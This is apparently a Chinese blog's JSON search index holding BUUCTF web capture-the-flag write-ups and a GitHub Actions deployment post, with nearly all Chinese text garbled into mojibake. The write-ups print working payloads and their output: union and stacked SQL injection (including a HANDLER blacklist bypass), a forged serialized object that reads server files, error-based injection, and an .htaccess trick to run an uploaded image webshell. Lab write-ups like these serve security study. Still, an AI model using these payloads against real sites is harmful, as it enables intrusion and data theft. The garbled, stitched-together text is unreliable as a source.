å¤‡ä»½user.php.bakæ–‡ä»¶ï¼ˆæˆ‘è‡³ä»Šä»ç„¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç”¨è¿™ä¸œè¥¿ä¸€èˆ¬éƒ½æ‰«ä¸å‡ºæ¥ä»€ä¹ˆæœ‰ä»·å€¼çš„ç»“æœï¼‰ã€‚é‡Œé¢å®šä¹‰äº†ä¸€ä¸ªUserInfoç±»å‹ï¼Œåº”è¯¥å°±æ˜¯æˆ‘ä»¬joinæ—¶è¾“å…¥çš„å†…å®¹ã€‚å…¶ä¸­isValidBlog()ä¼šå¯¹blogå­—æ®µè¿‡æ»¤ï¼ŒgetBlogContents()ä¼šè¯·æ±‚åšå®¢å†…å®¹å¹¶æ˜¾ç¤ºã€‚çœ‹åˆ°è¿™é‡Œå°±åº”è¯¥æœ‰ç‚¹æ„Ÿè§‰äº†ï¼Œè¿™é¢˜çš„é¢„æœŸè§£åº”è¯¥æ˜¯ç»•è¿‡blogå­—æ®µçš„åˆ¤æ–­ï¼Œç„¶åssrfè¯»å–æœåŠ¡ç«¯çš„flagã€‚ \u003c?php class UserInfo { public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) { $this-\u003ename = $name; $this-\u003eage = (int)$age; $this-\u003eblog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u003eget($this-\u003eblog); } public function isValidBlog () { $blog = $this-\u003eblog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); } } å†é…åˆè¾“å…¥/view.php?no=-1 union/**/select 1,group_concat(data),3,4 from users#ï¼Œä¼šå¾—åˆ° O:8:\"UserInfo\":3:{s:4:\"name\";s:4:\"test\";s:3:\"age\";i:14;s:4:\"blog\";s:9:\"dtest.com\";},O:8:\"UserInfo\":3:{s:4:\"name\";s:3:\"leo\";s:3:\"age\";i:22;s:4:\"blog\";s:15:\"1iu2y.github.io\";},O:8:\"UserInfo\":3:{s:4:\"name\";s:40:\"tes2\";s:3:\"age\";i:14;s:4:\"blog\";s:9:\"fwfwf.com\";} è¿™åˆšå¥½å°±æ˜¯UserInfoçš„åºåˆ—åŒ–ç»“æœã€‚æ‰€ä»¥å¯ä»¥çŒœåˆ°view.phpçš„é€»è¾‘å°±æ˜¯æ ¹æ®noæŸ¥è¯¢ï¼Œå†å°†æŸ¥è¯¢ç»“æœçš„dataæ è¿›è¡Œååºåˆ—åŒ–ï¼Œå¾—åˆ°blogå†…å®¹ï¼Œç„¶åè°ƒç”¨getblogcontents()ã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡ä¿®æ”¹ååºåˆ—åŒ–çš„è¾“å…¥ï¼Œå°±èƒ½å¤Ÿç»•è¿‡isValidBlog()çš„åˆ¤æ–­ã€‚ è€Œæˆ‘ä»¬ä¹‹å‰å¾—åˆ°çš„åˆ—åç»“æœä¸ºno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONSï¼Œdataåœ¨ç¬¬å››åˆ—ï¼Œæ‰€ä»¥æ„é€ çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²åº”è¯¥æ”¾åœ¨selectçš„ç¬¬å››ä¸ªä½ç½®ã€‚å†ç»“åˆphpä¼ªåè®®file://ï¼Œä»¥åŠ/flag.phpçš„è¯·æ±‚ç»“æœä¸º200ï¼ˆç†è®ºä¸Šæ¥è¯´è¿™ä¸€ç‚¹åœ¨æ‰«æçš„æ—¶å€™å°±èƒ½å¤Ÿå¾—çŸ¥ï¼‰ï¼Œå¯ä»¥æ„é€ ä»¥ä¸‹payloadï¼š /view.php?no=-1 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"a\";s:3:\"age\";i:10;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'# æŸ¥çœ‹æºç å¾—åˆ°base64ç¼–ç ã€‚ base64image-20210825140012191 \" base64 è§£ç å¾—åˆ°flag \u003c?php $flag = \"flag{340198f3-c539-4aac-8a0c-5c6759155623}\"; exit(0); ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:3:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x02-ç½‘é¼æ¯-2018fakebook"},{"categories":["CTF"],"content":"æ€»ç»“ è¿™é¢˜ç»“åˆäº†getè¯·æ±‚æ³¨å…¥ã€ç›®å½•æ‰«æã€ååºåˆ—åŒ–ã€phpä¼ªåè®®å¤šä¸ªè¦ç´ ï¼Œæ˜¯ä¸€é“å¾ˆæœ‰æ„æ€çš„é¢˜ï¼Œä¹Ÿæ˜¯ç›®å‰ä¸ºæ­¢æˆ‘åˆ·buuojè¿‡ç¨‹ä¸­ç¢°åˆ°çš„æœ€éš¾çš„webé¢˜ã€‚ ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:3:1","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#æ€»ç»“"},{"categories":["CTF"],"content":"0x03 [GYCTF2020]Blacklist é¢˜ç›®é“¾æ¥ 1' or 1=1#çœ‹åˆ°å½“å‰è¡¨ä¸­å­˜äº†3æ¡è®°å½•ã€‚ array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } array(2) { [0]=\u003e string(1) \"2\" [1]=\u003e string(12) \"miaomiaomiao\" } array(2) { [0]=\u003e string(6) \"114514\" [1]=\u003e string(2) \"ys\" } 1' union select 1,2,3 #å‘ç°set/selectç­‰ä¸è®ºå¤§å°å†™éƒ½è¢«è¿‡æ»¤äº†ã€‚ return preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject); è¿™åˆéš¾åˆ°äº†æˆ‘ï¼Œçœ‹äº†ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ä¹Ÿéœ€è¦selectå•Šï¼Œæ€ä¹ˆæ“ä½œå‘¢ï¼ŸæŸ¥é˜…åšå®¢åå›æƒ³èµ·ï¼Œæ³¨å…¥ä¸æ˜¯åªæœ‰unionè”åˆæ³¨å…¥ã€updataxmlæŠ¥é”™æ³¨å…¥ç­‰ï¼Œè¿˜æœ‰å †å æ³¨å…¥å•Šã€‚ 1';show tables;#æŸ¥çœ‹æ‰€æœ‰è¡¨ array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } ------------------------ array(1) { [0]=\u003e string(8) \"FlagHere\" } array(1) { [0]=\u003e string(5) \"words\" } ------------------------ 1';desc FalgHere;#æŸ¥çœ‹FlagHereè¡¨çš„ç»“æ„ array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } ------------------------ array(6) { [0]=\u003e string(4) \"flag\" [1]=\u003e string(12) \"varchar(100)\" [2]=\u003e string(2) \"NO\" [3]=\u003e string(0) \"\" [4]=\u003e NULL [5]=\u003e string(0) \"\" } ------------------------ flagå°±åœ¨è¿™é‡Œäº†ã€‚æ¥ä¸‹æ¥å¯ä»¥ç”¨prepareè®¾ç½®è®¡åˆ’ä»»åŠ¡ï¼Œä¹Ÿå¯ä»¥renameæ›´æ”¹è¡¨åï¼Œä½†æ˜¯è¿™äº›å…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†ã€‚æ‰€ä»¥è¿™é‡Œéœ€ä½¿ç”¨handleræ¥å®ç°æ³¨å…¥ã€‚ğŸ˜¶ åœ¨å †å æ³¨å…¥ä¸­ï¼Œå¯ä»¥åˆ©ç”¨handlerç›´æ¥åˆ—å‡ºéœ€è¦æŸ¥è¯¢å†…å®¹çš„è¡¨çš„æ•°æ®ï¼Œåªéœ€è¦çŸ¥é“è¡¨å https://blog.csdn.net/mochu7777777/article/details/109577534 1';handler FlagHere open;handler FlagHere read first;#å³å¯ array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } ------------------------ array(1) { [0]=\u003e string(42) \"flag{eb3f6fba-9f4e-402a-9252-c258ce1fe7cb}\" } ------------------------ ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:4:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x03-gyctf2020blacklist"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ iæ˜¥ç§‹2020æ–°æ˜¥å…¬ç›Šèµ› GYCTFæœ‰å…³SQLæ³¨å…¥é¢˜å¤ç° ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:4:1","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#å‚è€ƒé“¾æ¥-1"},{"categories":["CTF"],"content":"0x04 [GXYCTF2019]BabyUpload æ–‡ä»¶ä¸Šä¼ ï¼Œè¿‡æ»¤äº†åç¼€ååŒ…å«phçš„æ–‡ä»¶ã€‚é‚£æœ€ç›´æ¥çš„æ€è·¯å°±æ˜¯ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç„¶åå†ä¸Šä¼ .htaccessæˆ–è€….user.iniæ§åˆ¶æœåŠ¡ç«¯å°†å›¾ç‰‡ä½œä¸ºphpè§£æã€‚ éšä¾¿è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°æœåŠ¡ç«¯ç”¨çš„æ˜¯apacheã€‚ ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:5:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x04-gxyctf2019babyupload"},{"categories":["CTF"],"content":"Not Found The requested URL /test was not found on this server. Apache/2.4.10 (Debian) Server at 5d755b3b-244b-42ae-b90c-2c9b6a481f76.node4.buuoj.cn Port 80 æ‰€ä»¥æˆ‘ä»¬å°è¯•ä¸Šä¼ .htaccess \u003cFilesMatch \"leo.jpg\"\u003e SetHandler application/x-httpd-php \u003c/FilesMatch\u003e ç›´æ¥ä¸Šä¼ å½“ç„¶æ˜¯ä¸è¡Œçš„å•¦ï¼Œå¾—æ‹¦æˆªç„¶åä¿®æ”¹ä¸ºContent-Type: image/jpegã€‚ç„¶åå¸¸è§„æ“ä½œï¼Œä¸Šä¼ å›¾ç‰‡é©¬å†è¿æ¥å³å¯ã€‚ è¿™é‡Œæ¯”è¾ƒæçš„ä¸€ç‚¹æ˜¯ï¼Œæˆ‘å°è¯•äº†Content-Type: image/jpgå’ŒContent-Type: image/pngï¼Œå‘ç°éƒ½ä¸è¡Œï¼Œè¿˜ä»¥ä¸ºè¿™é¢˜åˆæ˜¯ä¸€ç§æ–°çš„ç»•è¿‡æ–¹å¼ã€‚å†çœ‹äº†åˆ«äººåšå®¢ä¹‹åæ‰å‘ç°ï¼ŒåŸæ¥å°±æ˜¯ä¸ªjpegçš„é—®é¢˜â€¦ æœ€åï¼Œå…³äºjpeg/jpg/png/bmp/gifè¿™äº›å¸¸è§çš„å›¾ç‰‡æ–‡ä»¶å¤´éƒ¨ç»“æ„ï¼Œå¯ä»¥ä¸ŠwikipediaæŸ¥çœ‹ã€‚ ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:0:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#not-found"},{"categories":["CTF"],"content":"0x05 [BUUCTF 2018]Online Tool php rceçš„é¢˜ï¼Œè¿™ç§ç±»å‹çš„æ²¡å­¦è¿‡å•Šï¼Œä¸ä¼šğŸ˜£ æç½®ä¸€ä¸‹ï¼Œåšé“Pwnæ¢æ¢è„‘å­ğŸŒšå»ã€‚ ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x05-buuctf-2018online-tool"},{"categories":["Hugo"],"content":"ä¼—æ‰€å‘¨çŸ¥ï¼Œhugoçš„github pageéƒ¨ç½²æœ‰ä¸¤ç§æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯æ‰‹åŠ¨éƒ¨ç½²ä¸github actionséƒ¨ç½²ã€‚ æ‰‹åŠ¨éƒ¨ç½²å°±æ˜¯æ‰‹åŠ¨å°†ç”Ÿæˆçš„publicæ–‡ä»¶å¤¹ä¸­çš„é™æ€ç½‘é¡µå†…å®¹æ¨é€åˆ°è¿œç¨‹GitHub pageä»“åº“ï¼Œä½†æ˜¯æ¯”è¾ƒç¹çï¼Œè€Œä¸”æºç æ–‡ä»¶å¤¹æœ¬èº«å°±æ˜¯ä¸€ä¸ªgitä»“åº“ï¼ŒåµŒå¥—çš„gitä»“åº“æ“ä½œéå¸¸éº»çƒ¦ï¼Œå®¹æ˜“å‡ºä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ã€‚ æ‰€ä»¥ï¼Œè‡ªåŠ¨åŒ–çš„github actionså°±æ˜¾å¾—éå¸¸é«˜æ•ˆç®€æ´äº†ã€‚ ä¿¡æ¯ æˆ‘ä»¬ä»ä¸€ä¸ªç°æœ‰çš„hugoé¡¹ç›®å¼€å§‹ã€‚ ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:0","series":null,"tags":["github","github actions"],"title":"Github Actions è®¾ç½®è®°å½•","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#"},{"categories":["Hugo"],"content":"å»ºç«‹è¿œç¨‹ä»“åº“ git initåˆå§‹åŒ– git remote add ...æ·»åŠ è¿œç¨‹ä»“åº“ ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:1","series":null,"tags":["github","github actions"],"title":"Github Actions è®¾ç½®è®°å½•","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#å»ºç«‹è¿œç¨‹ä»“åº“"},{"categories":["Hugo"],"content":"ç”Ÿæˆpersonal_token æ‰¾åˆ°ä¸ªäººèµ„æ–™çš„Settings-\u003eDevelop settings-\u003ePersonal access tokensï¼Œç‚¹å‡»Generate new tokenç”Ÿæˆpersonal tokenã€‚å‹¾é€‰å¦‚ä¸‹å†…å®¹ï¼Œå¹¶ä¸”æ³¨æ„åˆ°é»˜è®¤çš„tokenæœ‰æ•ˆæœŸæ˜¯30å¤©ï¼Œè¿™ä¹Ÿä¸ç”¨å»ä¿®æ”¹ä¸ºæ°¸ä¸è¿‡æœŸï¼Œå› ä¸ºæ°¸ä¹…çš„tokenæ˜¯éå¸¸å±é™©çš„ã€‚ personal tokenåˆ›å»ºimage-20210805135512950 \" personal tokenåˆ›å»º å°†è¯¥tokençš„å†…å®¹å¤åˆ¶ä¸‹æ¥ï¼Œç„¶åæ·»åŠ åˆ°githubä¸Šæºç ä»“åº“çš„secretsä¹‹ä¸­ã€‚ secretæ·»åŠ image-20210805140343530 \" secretæ·»åŠ  è®°å¾—è¿‡æœŸä¹‹åå†å»åˆ›å»ºä¸€ä¸ªï¼Œç„¶åä¿®æ”¹secretçš„å†…å®¹ã€‚ ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:2","series":null,"tags":["github","github actions"],"title":"Github Actions è®¾ç½®è®°å½•","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#ç”Ÿæˆpersonal_token"},{"categories":["Hugo"],"content":"æ·»åŠ github action æ·»åŠ .github/workflows/xxx.ymlæ–‡ä»¶ï¼Œåˆ›å»ºgithub actionã€‚ name:github pageson:push:branches:- master # Set a branch to deploypull_request:jobs:deploy:runs-on:ubuntu-20.04steps:- uses:actions/checkout@v2with:submodules:true# Fetch Hugo themes (true OR recursive)fetch-depth:0# Fetch all history for .GitInfo and .Lastmod- name:Setup Hugouses:peaceiris/actions-hugo@v2with:hugo-version:'latest'# extended: true- name:Buildrun:hugo -D- name:Deployuses:peaceiris/actions-gh-pages@v3with:personal_token:${{ secrets.ACTIONS_ACCESS_TOKEN }}# è¿™é‡Œçš„ ACTIONS_DEPLOY_KEY åˆ™æ˜¯ä¸Šé¢è®¾ç½® Private Keyçš„å˜é‡åexternal_repository:1iu2y/1iu2y.github.io# Pages è¿œç¨‹ä»“åº“ publish_dir:\"./public\"keep_files:false# remove existing filespublish_branch:master # deploying branchï¼Œå¯¹åº”äº1iu2y.github.ioä»“åº“çš„branchï¼Œè¯¥ä»“åº“çš„é»˜è®¤åˆ†æ”¯æ˜¯masterï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¹Ÿå®šä¹‰ä¸ºäº†mastercommit_message:${{ github.event.head_commit.message }}#commit_message: ${{ github.event.head_commit.message }} ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:3","series":null,"tags":["github","github actions"],"title":"Github Actions è®¾ç½®è®°å½•","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#æ·»åŠ github-action"},{"categories":["Hugo"],"content":"It works! actionæˆåŠŸæ‰§è¡Œimage-20210805143049479 \" actionæˆåŠŸæ‰§è¡Œ å¦ä¸€ä¸ªä»“åº“è¢«æˆåŠŸä¿®æ”¹image-20210805143127899 \" å¦ä¸€ä¸ªä»“åº“è¢«æˆåŠŸä¿®æ”¹ æŠ€å·§ é™¤å»personal_tokenä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨public_keyçš„æ–¹å¼è¿›è¡Œactionéƒ¨ç½²ï¼Œæœ‰å¾…å°è¯•ã€‚ å¦‚æœä½¿ç”¨deploy_keyçš„è¯ï¼Œå°†ymlæ–‡ä»¶å¯¹åº”å†…å®¹è¿›è¡Œä¿®æ”¹ã€‚è¿™ç§æ–¹å¼çš„å¥½å¤„åœ¨äºå¯†é’¥ä¸ä¼šè¿‡æœŸã€‚ with:# personal_token: ${{ secrets.ACTIONS_ACCESS_TOKEN }} # è¿™é‡Œçš„ ACTIONS_DEPLOY_KEY åˆ™æ˜¯ä¸Šé¢è®¾ç½® Private Keyçš„å˜é‡ådeploy_key:${{ secrets.ACTIONS_DEPLOY_KEY }}external_repository:1iu2y/1iu2y.github.io# Pages è¿œç¨‹ä»“åº“ publish_dir:\"./public\"keep_files:false# remove existing filespublish_branch:master # deploying branchcommit_message:${{ github.event.head_commit.message }}#commit_message: ${{ github.event.head_commit.message }} ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:4","series":null,"tags":["github","github actions"],"title":"Github Actions è®¾ç½®è®°å½•","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#it-works"},{"categories":["Hugo"],"content":"å‚è€ƒé“¾æ¥ï¼š https://zhuanlan.zhihu.com/p/109057290 ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:5","series":null,"tags":["github","github actions"],"title":"Github Actions è®¾ç½®è®°å½•","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#å‚è€ƒé“¾æ¥"},{"categories":["CTF"],"content":"0x00 [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL é¢˜ç›®é“¾æ¥ æ‰“å¼€é¢˜ç›®ï¼Œè¿˜æ˜¯ç†Ÿæ‚‰çš„ç”¨æˆ·åå¯†ç æ³¨å…¥ç•Œé¢ ç½‘ç«™é¦–é¡µimage-20210721115109030 \" ç½‘ç«™é¦–é¡µ é¦–å…ˆåˆ¤æ–­é—­åˆç±»å‹ï¼Œç”¨æˆ·åéšä¾¿å†™ï¼Œå¯†ç æ å¡«ä¸ªb'ï¼Œå‘ç°æŠ¥é”™ï¼Œè¯´æ˜æŸ¥è¯¢è¯­å¥æ˜¯å•å¼•å·é—­åˆã€‚ æŠ¥é”™ä¿¡æ¯1image-20210719170507319 \" æŠ¥é”™ä¿¡æ¯1 ç„¶åå°è¯•ä¸€ä¸‹å¯†ç b' or 1=1 #ï¼Œå‘ç°æŠ¥é”™ä¿¡æ¯ä¸­åªæœ‰'1=1 #''ã€‚ä¸€å¼€å§‹æˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯æ€ä¹ˆå›äº‹ï¼ŒæŸ¥é˜…èµ„æ–™ä¹‹åæ‰çŸ¥é“ï¼ŒåŸæ¥æœ‰çš„wafä¼šå¯¹orã€selectç­‰SQLè¯­å¥å…³é”®å­—åšè¿‡æ»¤ï¼Œæ¯”å¦‚ç›´æ¥æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥è¿™é¢˜è¦ä½¿ç”¨åŒå†™ç»•è¿‡ã€‚ æŠ¥é”™ä¿¡æ¯2image-20210719170705563 \" æŠ¥é”™ä¿¡æ¯2 è¯•ç€ä½¿ç”¨unionæŸ¥è¯¢ï¼Œè¾“å…¥b' ununionion seselectlect 1,2,3 #ï¼Œæ˜¾ç¤ºæˆåŠŸç™»å½•ä¿¡æ¯ï¼Œè¯´æ˜è¢«æŸ¥è¯¢çš„è¡¨çš„åˆ—æ•°ä¸º3ã€‚ å›æ˜¾ä¿¡æ¯image-20210721115510406 \" å›æ˜¾ä¿¡æ¯ æ¥ä¸‹æ¥å°±æ˜¯å¥—è·¯åŒ–çš„æ“ä½œï¼Œç²¾é«“æ˜¯ä½¿ç”¨information_schemaç­‰è®°å½•æ•°æ®åº“è‡ªèº«ä¿¡æ¯çš„æ•°æ®åº“ï¼Œä»¥åŠgroup_concat()å‡½æ•°ã€‚å› ä¸ºçœ‹åˆ°äº†2å’Œ3çš„å›æ˜¾ï¼Œæ‰€ä»¥æŠŠ2å’Œ3æ›¿æ¢ä¸ºå…¶å®ƒè¡¨è¾¾å¼å¯ä»¥è¿›è¡Œæ³¨å…¥ã€‚ æ‡’å¾—æ”¾æˆªå›¾ï¼Œç›´æ¥æŠŠå›æ˜¾ç»“æœè´´ä¸€ä¸‹ã€‚ é¦–å…ˆæŸ¥çœ‹å½“å‰æ•°æ®åº“ b' ununionion seselectlect 1,2,database() # Hello 2ï¼ Your password is 'geek' æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ b' ununionion seselectlect 1,2,group_concat(schema_name)frfromom (infoorrmation_schema.schemata) # Hello 2ï¼ Your password is 'information_schema,mysql,performance_schema,test,ctf,geek' çœ‹åˆ°ä¸€ä¸ªctfåº“ï¼Œå†å»çˆ†è¿™ä¸ªæ•°æ®åº“çš„è¡¨ b' ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=\"ctf\" # Hello 2ï¼ Your password is 'Flag' å…¶ä¸­æœ‰ä¸ªFlagè¡¨ï¼Œç„¶åå†å»çˆ†å­—æ®µ b' ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=\"Flag\" Hello 2ï¼ Your password is 'flag' å…¶ä¸­æœ‰flagå­—æ®µï¼Œå†å»çˆ†æ•°æ® b' ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) æ‹¿åˆ°flag Hello 2ï¼ Your password is 'flag{b11bfeba-d864-4a0a-97f6-77e3ef266da9}' ä¸ªäººæ„Ÿè§‰ï¼Œè¿™é¢˜çš„è¦ç‚¹åœ¨äºæ•°æ®åº“æœ¬èº«ä¿¡æ¯æ•°æ®åº“çš„å†…å®¹ï¼Œä»¥åŠgroup_concatçš„ä½¿ç”¨ï¼ŒåŒå†™ç»•è¿‡å…¶å®æ˜¯ä¸ªå¾ˆç®€å•çš„ä¸œè¥¿ã€‚ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x00-æå®¢å¤§æŒ‘æˆ˜-2019babysql"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ï¼š information_schemaæ•°æ®åº“ group_concat()å‡½æ•° ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:1:1","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#å‚è€ƒé“¾æ¥"},{"categories":["CTF"],"content":"0x01 [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL é¢˜ç›®é“¾æ¥ å¯ä»¥è¯•å‡ºæ˜¯å•å¼•å·é—­åˆï¼Œä½†æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ é˜²æ­¢github page buildå¤±è´¥image-20210727113650753 \" é˜²æ­¢github page buildå¤±è´¥ è¿™é¢˜çš„ä¸»è¦çŸ¥è¯†ç‚¹å°±æ˜¯åˆ©ç”¨updatexml()å’Œextractvalue()å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚ä½¿ç”¨concat()å‡½æ•°ï¼Œå†åŠ ä¸Š~æˆ–è€…@ç­‰èƒ½å¤Ÿå¼•èµ·è·¯å¾„å‚æ•°æŠ¥é”™çš„å­—ç¬¦ï¼Œå°†å½¢å¦‚concat(0x7e, è¯­å¥, 0x7e)è¿™æ ·çš„ç»“æœä½œä¸ºå‚æ•°ï¼Œå°±èƒ½å¤Ÿå¾—åˆ°XPATH syntax error: 'å›æ˜¾ç»“æœ'è¿™æ ·çš„æŠ¥é”™ä¿¡æ¯ï¼Œå®ç°æ³¨å…¥ã€‚ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:2:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x01-æå®¢å¤§æŒ‘æˆ˜-2019hardsql"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ï¼š https://blog.csdn.net/Xxy605/article/details/116999699 SQLæŠ¥é”™æ³¨å…¥æ”»å‡»ä¸­çš„updatexml()å‡½æ•° ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:2:1","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#å‚è€ƒé“¾æ¥-1"},{"categories":["CTF"],"content":"0x02 [HCTF 2018]admin é¢˜ç›®é“¾æ¥ è¿™æ˜¯ä¸€é“å¾ˆæœ‰è¶£çš„é¢˜ï¼Œç½‘ç«™æä¾›äº†æ³¨å†Œã€ç™»å½•ã€ä¿®æ”¹å¯†ç ç­‰åŠŸèƒ½ã€‚ çœ‹æºç å¤§è‡´å¯ä»¥æ„Ÿè§‰åˆ°ï¼Œéœ€è¦ä½ ä»¥adminèº«ä»½ç™»å½•ï¼Œæ‰èƒ½å¤Ÿè·å–flagï¼Œä½†æ˜¯adminæ˜¯å·²ç»æ³¨å†Œè¿‡çš„ç”¨æˆ·ï¼Œæ‰€ä»¥åœ¨ä¸çŸ¥é“adminå¯†ç çš„æƒ…å†µä¸‹æ— æ³•ç™»å½•ã€‚ æºç æç¤ºimage-20210724184059694 \" æºç æç¤º æŸ¥é˜…ä¸€äº›wpä¹‹åï¼Œå¯ä»¥å¾—åˆ°3ç§è§£æ³•ã€‚ ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x02-hctf-2018admin"},{"categories":["CTF"],"content":"è§£æ³•1ï¼šå¼±å¯†ç  è¿™æ˜¯å¾ˆæ‰¯çš„ä¸€ä¸ªè§£æ³•ï¼Œå¯ä»¥ç†è§£ä¸ºï¼Œæœºç¼˜å·§åˆï¼Œç›´æ¥è¯•å‡ºæ¥äº†adminçš„å¯†ç æ˜¯123ğŸ¤£ï¼Œç™»å½•æ‹¿åˆ°flag ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:1","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 